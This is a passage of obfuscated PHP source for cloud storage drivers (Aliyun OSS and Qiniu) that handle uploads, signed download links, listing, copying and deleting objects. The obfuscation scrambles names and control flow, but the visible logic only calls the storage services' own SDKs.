$dñ¥‘œÓÆ[1213] => array(array($dñ¥‘œÓÆ[1313], 0, $fÇ¦¢Ì›ê¤), array($dñ¥‘œÓÆ[1216], $dñ¥‘œÓÆ[1217], $cò†áª÷¤Ù))); $a›œäğœœ‡ = base64_encode(json_encode($B÷„·­ÊÄ–)); goto CŠìĞçŞ£‰; EÉ²Ğ´Ñ: } public function multiUploadFormData($BÌÑ¾í‘¸, $C™§¼òĞÅ§ = 3600) { $a¬ÒÑŞœ›µ =& $_SERVER[ä°„ä°º]; if (!($aãƒêêññÕ = $this->getHost())) { return !1; } $E¸Ö¥¥ÏÒ = $this->trafficLimit($a¬ÒÑŞœ›µ[1308]); $c’Ğ‡Ë××· = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($BÌÑ¾í‘¸), $E¸Ö¥¥ÏÒ); return array($a¬ÒÑŞœ›µ[221] => $c’Ğ‡Ë××·, $a¬ÒÑŞœ›µ[175] => $aãƒêêññÕ . $a¬ÒÑŞœ›µ[8] . $this->pathEncode($BÌÑ¾í‘¸), $a¬ÒÑŞœ›µ[222] => gmdate($a¬ÒÑŞœ›µ[1316]), $a¬ÒÑŞœ›µ[93] => $BÌÑ¾í‘¸); } public function multiUploadAuthData($C†ÄÈÅ¥ÙÔ, $B†±õ­òè¦ = array()) { goto DŠöËá¢Á»; Bá”Ø¤¥™: $d›Â™§é»¤ = $C†ÄÈÅ¥ÙÔ; if (isset($B†±õ­òè¦[$aĞÕ–à‡ÂÍ[93]])) { $d›Â™§é»¤ = $B†±õ­òè¦[$aĞÕ–à‡ÂÍ[93]]; unset($B†±õ­òè¦[$aĞÕ–à‡ÂÍ[93]]); } if (isset($B†±õ­òè¦[$aĞÕ–à‡ÂÍ[223]])) { $B†±õ­òè¦[$aĞÕ–à‡ÂÍ[222]] = $FÇÇ’“æ³; return $this->listUploadParts($d›Â™§é»¤, $B†±õ­òè¦); } goto A®ğôˆäÑ; a˜‚áŞŠíŸ: $aÒªğâÍÂ = $aĞÕ–à‡ÂÍ[1282] . $this->accessKey . $aĞÕ–à‡ÂÍ[4] . $BğÚø²æÆ; if (strpos($A­ŠñÔÄ—, $aĞÕ–à‡ÂÍ[225]) === 0) { $aÒªğâÍÂ = array($aĞÕ–à‡ÂÍ[232] => $aÒªğâÍÂ, $aĞÕ–à‡ÂÍ[222] => $FÇÇ’“æ³); if ($cëÖôâŠ¾Ñ) { $aÒªğâÍÂ = array_merge($aÒªğâÍÂ, $cëÖôâŠ¾Ñ); } } return $aÒªğâÍÂ; goto DÄ‹¦šÜ÷«; bƒÌ»Š±: if (!empty($B†±õ­òè¦[$aĞÕ–à‡ÂÍ[1318]])) { $bì±ÜõÚ¹ = array_merge(array($E‡Âø·Ü„®[4]), $B†±õ­òè¦[$aĞÕ–à‡ÂÍ[1318]]); sort($bì±ÜõÚ¹); $E‡Âø·Ü„®[4] = implode($aĞÕ–à‡ÂÍ[229], $bì±ÜõÚ¹); } $Dİ¢ Ì‚é‰ = implode($aĞÕ–à‡ÂÍ[229], $E‡Âø·Ü„®); $BğÚø²æÆ = base64_encode(hash_hmac($aĞÕ–à‡ÂÍ[230], $Dİ¢ Ì‚é‰, $this->secret, !0)); goto a˜‚áŞŠíŸ; DŠöËá¢Á»: $aĞÕ–à‡ÂÍ =& $_SERVER[ä°„ä°º]; $FÇÇ’“æ³ = isset($B†±õ­òè¦[$aĞÕ–à‡ÂÍ[222]]) ? $B†±õ­òè¦[$aĞÕ–à‡ÂÍ[222]] : gmdate($aĞÕ–à‡ÂÍ[1316]); $A­ŠñÔÄ— = isset($B†±õ­òè¦[$aĞÕ–à‡ÂÍ[168]]) ? $B†±õ­òè¦[$aĞÕ–à‡ÂÍ[168]] : $aĞÕ–à‡ÂÍ[33]; goto Bá”Ø¤¥™; A®ğôˆäÑ: $E‡Âø·Ü„® = array($aĞÕ–à‡ÂÍ[224], $aĞÕ–à‡ÂÍ[33], $aĞÕ–à‡ÂÍ[119], $FÇÇ’“æ³, "\x78\55\157\163\x73\x2d\144\x61\x74\145\x3a{$FÇÇ’“æ³}", $aĞÕ–à‡ÂÍ[8] . $this->bucket . $aĞÕ–à‡ÂÍ[8] . $d›Â™§é»¤ . $A­ŠñÔÄ—); if (strpos($A­ŠñÔÄ—, $aĞÕ–à‡ÂÍ[225]) === 0) { $E‡Âø·Ü„®[0] = $aĞÕ–à‡ÂÍ[226]; if ($cëÖôâŠ¾Ñ = $this->trafficLimit($aĞÕ–à‡ÂÍ[1308])) { $d›Â™§é»¤ = $aĞÕ–à‡ÂÍ[1317]; array_splice($E‡Âø·Ü„®, 5, 0, $d›Â™§é»¤ . $aĞÕ–à‡ÂÍ[4] . $cëÖôâŠ¾Ñ[$d›Â™§é»¤]); } } if (isset($B†±õ­òè¦[$aĞÕ–à‡ÂÍ[227]]) && $B†±õ­òè¦[$aĞÕ–à‡ÂÍ[227]] == $aĞÕ–à‡ÂÍ[228]) { $E‡Âø·Ü„®[0] = $aĞÕ–à‡ÂÍ[228]; } goto bƒÌ»Š±; DÄ‹¦šÜ÷«: } public function listUploadParts($FŒ·ñˆÈĞ, $aèƒ÷ƒÎæŠ) { goto EÔ±Ìê™á§; EÔ±Ìê™á§: $Eë‚‹°šÊ =& $_SERVER[ä°„ä°º]; $CŠ®î„ÎÌ‰ = parse_url_query($aèƒ÷ƒÎæŠ[$Eë‚‹°šÊ[168]]); $Bº³ˆ·Ã»– = $this->client->listParts($this->bucket, $this->pathEncode($FŒ·ñˆÈĞ), $CŠ®î„ÎÌ‰[$Eë‚‹°šÊ[221]]); goto b«õ™á²î˜; b«õ™á²î˜: $b‰ÎÓğØÛ = $Bº³ˆ·Ã»–->getListPart(); $fÎ„‹ÍĞ = array(); foreach ($b‰ÎÓğØÛ as $cÈÛœã„§) { $fÎ„‹ÍĞ[] = array($Eë‚‹°šÊ[1302] => $cÈÛœã„§->getPartNumber(), $Eë‚‹°šÊ[1303] => trim($cÈÛœã„§->getETag(), $Eë‚‹°šÊ[116])); } goto C·ò¿”¬ö; b¦³ƒ‹Å»: return array($Eë‚‹°šÊ[232] => $e¬Ì÷Ü‹´Ë, $Eë‚‹°šÊ[222] => $aèƒ÷ƒÎæŠ[$Eë‚‹°šÊ[222]], $Eë‚‹°šÊ[234] => $fÎ„‹ÍĞ); goto aóæáÔ±îš; C·ò¿”¬ö: unset($aèƒ÷ƒÎæŠ[$Eë‚‹°šÊ[223]], $aèƒ÷ƒÎæŠ[$Eë‚‹°šÊ[227]]); $e¬Ì÷Ü‹´Ë = $this->multiUploadAuthData($FŒ·ñˆÈĞ, $aèƒ÷ƒÎæŠ); if (empty($e¬Ì÷Ü‹´Ë)) { return !1; } goto b¦³ƒ‹Å»; aóæáÔ±îš: } public function download($cÅŸá÷á†, $f…¥¯Âî‚…) { if ($this->isFolder($cÅŸá÷á†)) { return !1; } try { $BæƒŒ “Šô = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f…¥¯Âî‚…); $BæƒŒ “Šô = $this->trafficLimit($_SERVER[ä°„ä°º][109], $BæƒŒ “Šô); $this->client->getObject($this->bucket, $this->pathEncode($cÅŸá÷á†), $BæƒŒ “Šô); } catch (OSS\Core\OssException $CóÀ„„Û®) { return !1; } return $f…¥¯Âî‚…; } public function fileSubstr($aÈºØÍ§åµ, $cŠ¼è´õĞ = 0, $D‹ÖÀäø®ó = false) { if ($cŠ¼è´õĞ === -1) { $Câï•ï¼Î = array(); } else { if ($D‹ÖÀäø®ó === !1) { $bèö¹æÀÃ = $this->size($aÈºØÍ§åµ); } else { $bèö¹æÀÃ = $cŠ¼è´õĞ + $D‹ÖÀäø®ó - 1; } $Câï•ï¼Î = array(OSS\OssClient::OSS_RANGE => "{$cŠ¼è´õĞ}\x2d{$bèö¹æÀÃ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($aÈºØÍ§åµ), $Câï•ï¼Î); } catch (OSS\Core\OssException $c®¹Á¹…œ½) { think_exception($c®¹Á¹…œ½->getMessage()); return !1; } } private function trafficLimit($C¤ñ“ô‚‰œ, $BÈŠ˜Êœ£ = array()) { goto C®¯ù–²‹‘; C®¯ù–²‹‘: $b“ë—Úë‚… =& $_SERVER[ä°„ä°º]; if ($C¤ñ“ô‚‰œ == $b“ë—Úë‚…[1308] && $this->isUploadServer() || $C¤ñ“ô‚‰œ == $b“ë—Úë‚…[109] && $this->isFileOutServer()) { return $BÈŠ˜Êœ£; } $Dï¯£†ñÌ– = floatval($GLOBALS[$b“ë—Úë‚…[6]][$b“ë—Úë‚…[88]][$b“ë—Úë‚…[107]][$C¤ñ“ô‚‰œ]) * 1024 * 1024 * 8; goto B‘éòùÕ¹“; DğëÄ¢‘ï§: return $BÈŠ˜Êœ£; goto c¶½Õ³Æ„¿; B‘éòùÕ¹“: if (!$Dï¯£†ñÌ–) { return $BÈŠ˜Êœ£; } $Dï¯£†ñÌ– = $Dï¯£†ñÌ– < 819200 ? 819200 : ($Dï¯£†ñÌ– > 838860800 ? 838860800 : $Dï¯£†ñÌ–); $BÈŠ˜Êœ£[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Dï¯£†ñÌ–); goto DğëÄ¢‘ï§; c¶½Õ³Æ„¿: } public function link($bÀ’ŒîØ´“, $EÎÔŠÇä‹ = array()) { $BÄÒƒ½ä”ˆ =& $_SERVER[ä°„ä°º]; if (!$this->exist($bÀ’ŒîØ´“) || $this->isFolder($bÀ’ŒîØ´“)) { return !1; } try { $EÎÔŠÇä‹ = $this->trafficLimit($BÄÒƒ½ä”ˆ[109], $EÎÔŠÇä‹); $c”æ¼¯§Ñ = $this->client->signUrl($this->bucket, $this->pathEncode($bÀ’ŒîØ´“), 3600 * 12, $BÄÒƒ½ä”ˆ[228], $EÎÔŠÇä‹); return $this->getCdnLink($c”æ¼¯§Ñ); } catch (OSS\Core\OssException $e¨…Š¢Ãçª) { return !1; } } public function fileOut($f†ÓÙ‚Îù…, $D†ãƒÇß£ = false, $dÖÛÃÅØ°Æ = false, $eÆ¶Øî‰ = '') { goto BÂƒç‰˜«; bˆ¯Ô¼áà: $dÖÛÃÅØ°Æ = rawurlencode($dÖÛÃÅØ°Æ); $BôÕÍ‹İğŸ = get_file_mime(get_path_ext($dÖÛÃÅØ°Æ)); if ($BôÕÍ‹İğŸ == $Fñê«¥Äñ[213]) { return parent::fileOut($f†ÓÙ‚Îù…, $D†ãƒÇß£, $dÖÛÃÅØ°Æ, $eÆ¶Øî‰); } goto dç ­îß˜ğ; dç ­îß˜ğ: $D†ãƒÇß£ = $D†ãƒÇß£ ? $Fñê«¥Äñ[214] : $Fñê«¥Äñ[215]; $CÛèÔ÷ñ˜ê = array(OSS\OssClient::OSS_SUB_RESOURCE => $Fñê«¥Äñ[1319] . rawurlencode("{$D†ãƒÇß£}\73\x66\x69\154\x65\x6e\x61\x6d\145\x3d{$dÖÛÃÅØ°Æ}")); $CÛèÔ÷ñ˜ê[OSS\OssClient::OSS_SUB_RESOURCE] .= $Fñê«¥Äñ[1320] . rawurlencode($BôÕÍ‹İğŸ); goto e÷ô¦ò«ğŸ; e÷ô¦ò«ğŸ: $d‰»•³Úçƒ = $this->link($f†ÓÙ‚Îù…, $CÛèÔ÷ñ˜ê); $this->fileOutLink($d‰»•³Úçƒ); goto C‡­‘¯ÛÅÛ; BÂƒç‰˜«: $Fñê«¥Äñ =& $_SERVER[ä°„ä°º]; if ($this->isFileOutServer()) { return $this->fileOutServer($f†ÓÙ‚Îù…, $D†ãƒÇß£, $dÖÛÃÅØ°Æ, $eÆ¶Øî‰); } if (!$dÖÛÃÅØ°Æ) { $dÖÛÃÅØ°Æ = $this->pathThis($f†ÓÙ‚Îù…); } goto bˆ¯Ô¼áà; C‡­‘¯ÛÅÛ: } public function fileOutServer($f›»¹¿¤Ò”, $eĞÓèˆ¤„Ş = false, $eÃ®»è±“ˆ = false, $bŸæ‘÷à·› = '') { parent::fileOut($f›»¹¿¤Ò”, $eĞÓèˆ¤„Ş, $eÃ®»è±“ˆ, $bŸæ‘÷à·›); } public function fileOutImage($C§İÙ­Å¡§, $bëïÖµ”‚ò = 250) { $BËÙóÏÍ¡ê = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ä°„ä°º][1321] . $bëïÖµ”‚ò); $F¼ƒš¨¬¨‚ = $this->link($C§İÙ­Å¡§, $BËÙóÏÍ¡ê); $this->fileOutLink($F¼ƒš¨¬¨‚); } public function fileOutImageServer($CÒœÌ…õ, $BÀ¨ôåÍ½à = 250) { parent::fileOutImage($CÒœÌ…õ, $BÀ¨ôåÍ½à); } public function fileOutLink($Aíá©­¿‚) { $eåÄƒ…‡¢¶ =& $_SERVER[ä°„ä°º]; if (!$this->isCdnHost() && substr($Aíá©­¿‚, 0, 7) == $eåÄƒ…‡¢¶[1225]) { $Aíá©­¿‚ = $eåÄƒ…‡¢¶[1226] . substr($Aíá©­¿‚, 7); } header($eåÄƒ…‡¢¶[159] . $Aíá©­¿‚); die; } public function hashMd5($Dª´ëÚ÷è˜, $EÍËÙé¢¿ = '') { $e¸ Äƒ¼ù =& $_SERVER[ä°„ä°º]; $FÕ¨Å¼Ï¡— = $this->_objectMeta($Dª´ëÚ÷è˜); if (!$FÕ¨Å¼Ï¡—) { return $e¸ Äƒ¼ù[33]; } if (!isset($FÕ¨Å¼Ï¡—[$e¸ Äƒ¼ù[1298]]) && !empty($EÍËÙé¢¿)) { $dÀĞÂİ‚îŸ = $this->updateObjMeta($Dª´ëÚ÷è˜, array($e¸ Äƒ¼ù[1298] => $EÍËÙé¢¿)); $FÕ¨Å¼Ï¡—[$e¸ Äƒ¼ù[1298]] = $dÀĞÂİ‚îŸ ? $EÍËÙé¢¿ : $e¸ Äƒ¼ù[33]; } return isset($FÕ¨Å¼Ï¡—[$e¸ Äƒ¼ù[1298]]) ? strtolower($FÕ¨Å¼Ï¡—[$e¸ Äƒ¼ù[1298]]) : $e¸ Äƒ¼ù[33]; } public function size($CšÓßµïĞ) { $EäµÈ²‡Ğ = $this->objectMeta($CšÓßµïĞ); return $EäµÈ²‡Ğ ? $EäµÈ²‡Ğ[$_SERVER[ä°„ä°º][78]] : 0; } public function info($Aİ‚ôŠ‚Œ÷) { if ($this->isFolder($Aİ‚ôŠ‚Œ÷)) { return $this->folderInfo($Aİ‚ôŠ‚Œ÷); } else { if ($this->isFile($Aİ‚ôŠ‚Œ÷)) { return $this->fileInfo($Aİ‚ôŠ‚Œ÷); } } return !1; } public function exist($B¸ŞéºÙ…Ä) { return $this->isFile($B¸ŞéºÙ…Ä) || $this->isFolder($B¸ŞéºÙ…Ä); } public function isFile($eòÒ¾ËÇõ™) { return !$this->isFolder($eòÒ¾ËÇõ™) && $this->objectMeta($eòÒ¾ËÇõ™); } public function isFolder($B¿˜™Ü„ß) { return $this->cacheMethod($_SERVER[ä°„ä°º][199], $B¿˜™Ü„ß); } protected function objectMeta($FèÆ ŸğÍõ) { return $this->cacheMethod($_SERVER[ä°„ä°º][200], $FèÆ ŸğÍõ); } protected function _objectMeta($D…ÕŞµ‚®) { $F„×‹à³ó =& $_SERVER[ä°„ä°º]; try { $a´¼¦öË‘³ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($D…ÕŞµ‚®)); } catch (OSS\Core\OssException $aÃ©¾ñùŠ) { $a´¼¦öË‘³ = !1; } if ($a´¼¦öË‘³) { $a´¼¦öË‘³[$F„×‹à³ó[78]] = intval($a´¼¦öË‘³[$F„×‹à³ó[1296]]); } return $a´¼¦öË‘³; } protected function _isFolder($AàÜÂƒÉÅ) { $d¬Ê‡õĞ©° =& $_SERVER[ä°„ä°º]; if ($AàÜÂƒÉÅ == $d¬Ê‡õĞ©°[33] || $AàÜÂƒÉÅ == $d¬Ê‡õĞ©°[8]) { return !0; } $Dâ»—Í„±ø = array($d¬Ê‡õĞ©°[1292] => $d¬Ê‡õĞ©°[8], $d¬Ê‡õĞ©°[1293] => rtrim($AàÜÂƒÉÅ, $d¬Ê‡õĞ©°[8]) . $d¬Ê‡õĞ©°[8], $d¬Ê‡õĞ©°[1294] => 1, $d¬Ê‡õĞ©°[1295] => $d¬Ê‡õĞ©°[33]); $dœÂ‚œÙ‡Ò = $this->client->listObjects($this->bucket, $Dâ»—Í„±ø); if ($dœÂ‚œÙ‡Ò->getObjectList() || $dœÂ‚œÙ‡Ò->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($eßª¥šŒí) { parent::__construct(); require_once SDK_DIR . $_SERVER[ä°„ä°º][1322]; $this->_init($eßª¥šŒí); } public function _init($Eâ¬Ÿçšò) { goto FºØÔôé¢•; CÔˆâ‚ÍºŒ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto f¯Øò‰Æ‡; FºØÔôé¢•: $cóæÜ¸ÄñĞ =& $_SERVER[ä°„ä°º]; foreach ($Eâ¬Ÿçšò as $FƒğÛöˆŒ§ => $d‹æ²©¡ˆ¾) { if (isset($this->{$FƒğÛöˆŒ§})) { $this->{$FƒğÛöˆŒ§} = $d‹æ²©¡ˆ¾; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($cóæÜ¸ÄñĞ[1323] . LNG($cóæÜ¸ÄñĞ[1283])); } goto CÔˆâ‚ÍºŒ; f¯Øò‰Æ‡: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto bË‰§šÃä; bË‰§šÃä: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($c“¹¿ğîÖ, $A££´è‰Ÿğ = '', $CÅ’†Å·¸° = REPEAT_RENAME) { if ($this->setContent($c“¹¿ğîÖ, $A££´è‰Ÿğ)) { return $this->getPathOuter($c“¹¿ğîÖ); } return !1; } public function mkdir($A ƒêÃ˜æ, $dÉ®„º¬å = REPEAT_SKIP) { goto dƒÎÃÍ¦Íô; f´ƒ†µ¤Ûª: $A ƒêÃ˜æ = $A¾ÑÜ«“É . $E†“¬—ÌİÅ[8]; $a‘÷ô¬õœ = get_path_this($A¾ÑÜ«“É); $f‹‚‹°†Õñ = $A ƒêÃ˜æ . $a‘÷ô¬õœ; goto bç¡¤”×®’; dƒÎÃÍ¦Íô: $E†“¬—ÌİÅ =& $_SERVER[ä°„ä°º]; $A¾ÑÜ«“É = trim($A ƒêÃ˜æ, $E†“¬—ÌİÅ[8]); if ($this->_isFolder($A¾ÑÜ«“É)) { return $this->getPathOuter($A¾ÑÜ«“É); } goto f´ƒ†µ¤Ûª; bç¡¤”×®’: if (!$this->mkfile($f‹‚‹°†Õñ)) { return !1; } if (!$this->moveFile($f‹‚‹°†Õñ, $A ƒêÃ˜æ)) { $this->delFile($f‹‚‹°†Õñ); return !1; } return $this->getPathOuter($A¾ÑÜ«“É); goto C¼Äİ¢‹¤Õ; C¼Äİ¢‹¤Õ: } public function copyFile($A…¶èîÅ™, $A…ª¨²Ì») { $B£»£ğ¸· = $this->bucketManager->copy($this->bucket, $A…¶èîÅ™, $this->bucket, $A…ª¨²Ì», !0); return $B£»£ğ¸· ? !1 : $this->getPathOuter($A…ª¨²Ì»); } public function moveFile($B­„‰†ß®, $Dİ’£æ‚¯İ) { $B‹èÎ®·Ä² = $this->bucketManager->move($this->bucket, $B­„‰†ß®, $this->bucket, $Dİ’£æ‚¯İ, !0); return $B‹èÎ®·Ä² ? !1 : $this->getPathOuter($Dİ’£æ‚¯İ); } public function delFile($b—¨±××”É) { if (!$this->exist($b—¨±××”É)) { return !0; } $A®ÕÅÛƒ± = $this->bucketManager->delete($this->bucket, $b—¨±××”É); return $A®ÕÅÛƒ± ? !1 : !0; } public function delFolder($D´ËÀ¤ÔÌ¸) { goto dÏ‡™¯Şé»; e—’òØĞ‚İ: $Dò¢»å ¡Æ = $this->fileList($D´ËÀ¤ÔÌ¸); $this->listItemCache = !0; $CİÌ†‰¹¹ = trim($D´ËÀ¤ÔÌ¸, $f†¾“´æç[8]) . $f†¾“´æç[8]; goto a­ªš•ò„¬; a­ªš•ò„¬: if (!empty($D´ËÀ¤ÔÌ¸) && $D´ËÀ¤ÔÌ¸ !== $f†¾“´æç[191] && !in_array($CİÌ†‰¹¹, $Dò¢»å ¡Æ[$f†¾“´æç[75]])) { $Dò¢»å ¡Æ[$f†¾“´æç[75]][] = $CİÌ†‰¹¹; } $AÁ‹èÊ£÷ï = $this->delByBatch($Dò¢»å ¡Æ[$f†¾“´æç[74]]); if (!$AÁ‹èÊ£÷ï) { return !1; } goto a¦šñİ‘´; dÏ‡™¯Şé»: $f†¾“´æç =& $_SERVER[ä°„ä°º]; if (!$this->exist($D´ËÀ¤ÔÌ¸)) { return !0; } $this->listItemCache = !1; goto e—’òØĞ‚İ; a¦šñİ‘´: $AÁ‹èÊ£÷ï = $this->delByBatch($Dò¢»å ¡Æ[$f†¾“´æç[75]]); if (!$AÁ‹èÊ£÷ï) { return !1; } return $this->delFile($CİÌ†‰¹¹); goto A³´ì«ÄŠ; A³´ì«ÄŠ: } private function delByBatch($BÛ“êª™Óê) { foreach (array_chunk($BÛ“êª™Óê, 1000) as $fÅ™øøƒ™) { $BÈ’«êºê = $this->bucketManager->buildBatchDelete($this->bucket, $fÅ™øøƒ™); list($cøÄ‹ÀÓÂÆ, $fÌã“Û¨Ò©) = $this->bucketManager->batch($BÈ’«êºê); if ($fÌã“Û¨Ò©) { return !1; } } return !0; } public function rename($E½À…¤çœ, $bŸ•õ‚¦) { return $this->renameObject($E½À…¤çœ, $bŸ•õ‚¦); } public function fileInfo($D¡ˆ‹…Ì, $D—Ö²¸Íë… = false, $eÌ©áÅŠ = array()) { goto Aîâ£°§ò­; Aîâ£°§ò­: $Cï¬—è¿ =& $_SERVER[ä°„ä°º]; $A²Ñ¿ŒÓëË = array($Cï¬—è¿[28] => $this->pathThis($D¡ˆ‹…Ì), $Cï¬—è¿[76] => $this->getPathOuter($Cï¬—è¿[8] . $D¡ˆ‹…Ì), $Cï¬—è¿[29] => $Cï¬—è¿[193], $Cï¬—è¿[78] => isset($eÌ©áÅŠ[$Cï¬—è¿[1324]]) ? $eÌ©áÅŠ[$Cï¬—è¿[1324]] : 0, $Cï¬—è¿[168] => $this->ext($D¡ˆ‹…Ì)); if ($D—Ö²¸Íë…) { return $A²Ñ¿ŒÓëË; } goto dôÑˆø¦í; dôÑˆø¦í: $A²Ñ¿ŒÓëË[$Cï¬—è¿[194]] = $A²Ñ¿ŒÓëË[$Cï¬—è¿[84]] = 0; $A²Ñ¿ŒÓëË[$Cï¬—è¿[195]] = $A²Ñ¿ŒÓëË[$Cï¬—è¿[196]] = !0; if (empty($eÌ©áÅŠ)) { $eÌ©áÅŠ = $this->objectMeta($D¡ˆ‹…Ì); if (!$eÌ©áÅŠ) { return $A²Ñ¿ŒÓëË; } } goto C¯Íç„…½; C¯Íç„…½: if (isset($eÌ©áÅŠ[$Cï¬—è¿[1325]])) { $A²Ñ¿ŒÓëË[$Cï¬—è¿[84]] = substr($eÌ©áÅŠ[$Cï¬—è¿[1325]] . $Cï¬—è¿[33], 0, 10); } if (isset($eÌ©áÅŠ[$Cï¬—è¿[1324]])) { $A²Ñ¿ŒÓëË[$Cï¬—è¿[78]] = $eÌ©áÅŠ[$Cï¬—è¿[1324]]; } return $A²Ñ¿ŒÓëË; goto DãÉîöø£; DãÉîöø£: } public function folderInfo($eßÕòˆæ”¬, $Dª³¤„Ô†î = false) { goto E­…õ†íêâ; aÉ­©Û·î: $cáóòÌŠ [$b¤óµèÑ¸×[194]] = $cáóòÌŠ [$b¤óµèÑ¸×[84]] = 0; $cáóòÌŠ [$b¤óµèÑ¸×[195]] = $cáóòÌŠ [$b¤óµèÑ¸×[196]] = !0; $eßÕòˆæ”¬ = rtrim($eßÕòˆæ”¬, $b¤óµèÑ¸×[8]) . $b¤óµèÑ¸×[8]; goto Aì•ì‹Š‰¸; E­…õ†íêâ: $b¤óµèÑ¸× =& $_SERVER[ä°„ä°º]; $cáóòÌŠ  = array($b¤óµèÑ¸×[28] => $this->pathThis($eßÕòˆæ”¬), $b¤óµèÑ¸×[76] => $this->getPathOuter($b¤óµèÑ¸×[8] . $eßÕòˆæ”¬), $b¤óµèÑ¸×[29] => $b¤óµèÑ¸×[77]); if ($Dª³¤„Ô†î) { return $cáóòÌŠ ; } goto aÉ­©Û·î; Aì•ì‹Š‰¸: $Cõ—ï‚‘ëô = $this->objectMeta($eßÕòˆæ”¬); if (isset($Cõ—ï‚‘ëô[$b¤óµèÑ¸×[1325]])) { $cáóòÌŠ [$b¤óµèÑ¸×[84]] = substr($Cõ—ï‚‘ëô[$b¤óµèÑ¸×[1325]] . $b¤óµèÑ¸×[33], 0, 10); } return $cáóòÌŠ ; goto E¬¤éšîàÅ; E¬¤éšîàÅ: } public function listPath($aßØ©ÇÎæ, $b©ÊÊñ°š‰ = false) { $eí©œ­´ã =& $_SERVER[ä°„ä°º]; $CÈê¦ßß· = $this->fileList($aßØ©ÇÎæ, $eí©œ­´ã[8], !0); foreach ($CÈê¦ßß·[$eí©œ­´ã[75]] as $e—·Ç·ŒÃ => $bÄœª¥œµ) { $CÈê¦ßß·[$eí©œ­´ã[75]][$e—·Ç·ŒÃ] = $this->folderInfo($bÄœª¥œµ, $b©ÊÊñ°š‰); } foreach ($CÈê¦ßß·[$eí©œ­´ã[74]] as $e—·Ç·ŒÃ => $bÄœª¥œµ) { $CÈê¦ßß·[$eí©œ­´ã[74]][$e—·Ç·ŒÃ] = $this->fileInfo($bÄœª¥œµ[$eí©œ­´ã[93]], $b©ÊÊñ°š‰, $bÄœª¥œµ); } return $CÈê¦ßß·; } public function has($dˆÛßŒ“¾, $F«æŞäŸÑ’ = false, $dŒÇ’à–æ = true) { goto bøâ¿ï¯èÅ; bøâ¿ï¯èÅ: $f¸¨Ô®íÍ =& $_SERVER[ä°„ä°º]; $dˆÛßŒ“¾ = trim($dˆÛßŒ“¾, $f¸¨Ô®íÍ[8]); $fÈË»†–« = empty($dˆÛßŒ“¾) && $dˆÛßŒ“¾ !== $f¸¨Ô®íÍ[191] ? $f¸¨Ô®íÍ[33] : $dˆÛßŒ“¾ . $f¸¨Ô®íÍ[8]; goto F§“ëØèÖÆ; F§“ëØèÖÆ: $d¶¿Å›ùé‡ = $f¸¨Ô®íÍ[33]; $FİåÇ……Ë = 500; $a‰ãå£Ëô˜ = $f¸¨Ô®íÍ[8]; goto B”î«Æó; CÃĞèëõÜÚ: return !1; goto bÆ©¥åàí´; B”î«Æó: $eå‚Œğ¦± = $b“…Œ®Ú¯± = 0; while (!0) { check_abort(); list($DùãÛÃåì, $C‹™‹ñÎ•) = $this->bucketManager->listFiles($this->bucket, $fÈË»†–«, $d¶¿Å›ùé‡, $FİåÇ……Ë, $a‰ãå£Ëô˜); if ($C‹™‹ñÎ•) { break; } $d¶¿Å›ùé‡ = array_key_exists($f¸¨Ô®íÍ[1295], $DùãÛÃåì) ? $d¶¿Å›ùé‡ = $DùãÛÃåì[$f¸¨Ô®íÍ[1326]] : $f¸¨Ô®íÍ[33]; if ($F«æŞäŸÑ’) { if (!empty($DùãÛÃåì[$f¸¨Ô®íÍ[1327]])) { $eå‚Œğ¦± += count($DùãÛÃåì[$f¸¨Ô®íÍ[1327]]); } if (!empty($DùãÛÃåì[$f¸¨Ô®íÍ[1328]])) { $b“…Œ®Ú¯± += count($DùãÛÃåì[$f¸¨Ô®íÍ[1328]]); } if ($d¶¿Å›ùé‡ === $f¸¨Ô®íÍ[33]) { break; } continue; } if ($dŒÇ’à–æ) { if (!empty($DùãÛÃåì[$f¸¨Ô®íÍ[1327]])) { return !0; } } else { if (!empty($DùãÛÃåì[$f¸¨Ô®íÍ[1328]])) { return !0; } } if ($d¶¿Å›ùé‡ === $f¸¨Ô®íÍ[33]) { break; } } if ($F«æŞäŸÑ’) { return array($f¸¨Ô®íÍ[203] => $eå‚Œğ¦±, $f¸¨Ô®íÍ[204] => $b“…Œ®Ú¯±); } goto CÃĞèëõÜÚ; bÆ©¥åàí´: } public function listAll($c®ˆÆŠÛ…) { $c¹¥Åèø =& $_SERVER[ä°„ä°º]; $Fààğ…ì—ä = $this->fileList($c®ˆÆŠÛ…, $c¹¥Åèø[33], !0); $F¯Éğç›¿Ö = array(); foreach ($Fààğ…ì—ä[$c¹¥Åèø[74]] as $B²‚Ô¹¡Á®) { $F¯Éğç›¿Ö[$B²‚Ô¹¡Á®[$c¹¥Åèø[93]]] = $B²‚Ô¹¡Á®[$c¹¥Åèø[78]]; } foreach ($Fààğ…ì—ä[$c¹¥Åèø[75]] as $B²‚Ô¹¡Á®) { if (is_string($B²‚Ô¹¡Á®)) { $F¯Éğç›¿Ö[$B²‚Ô¹¡Á®] = 0; } } return $this->listAllFiles($c®ˆÆŠÛ…, array_keys($F¯Éğç›¿Ö), $F¯Éğç›¿Ö); } private function fileList($aùí¿àä›µ, $bÛ†Íó’Ç = '', $e©šŞ®˜Ù‡ = 0) { goto f†ãœèæØ; B¢ê¡İé‘º: return array($e— »ÉÁœŠ[75] => $d®ë“®Ç‹, $e— »ÉÁœŠ[74] => $B¶ƒÅÂ×ÍÙ); goto EÊù‡ĞãŸà; f†ãœèæØ: $e— »ÉÁœŠ =& $_SERVER[ä°„ä°º]; $aùí¿àä›µ = trim($aùí¿àä›µ, $e— »ÉÁœŠ[8]); $Aã÷ÙôÖ©ˆ = empty($aùí¿àä›µ) && $aùí¿àä›µ 